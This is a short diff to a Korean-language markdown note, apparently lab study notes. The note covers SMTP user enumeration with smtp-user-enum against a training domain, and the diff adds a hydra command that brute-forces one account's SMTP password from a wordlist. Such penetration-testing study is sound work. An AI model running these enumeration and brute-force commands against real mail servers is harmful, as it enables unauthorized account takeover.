@@ -89,6 +89,9 @@ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
 
 smtp-user-enum -M EXPN -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
 ```
+```bash
+hydra -l 'marlin@inlanefreight.htb' -P pws.list smtp://10.129.203.12
+```
 
 ### 옵션 설명
 - `-M VRFY`: VRFY 명령어 사용 (사용자 존재 확인)
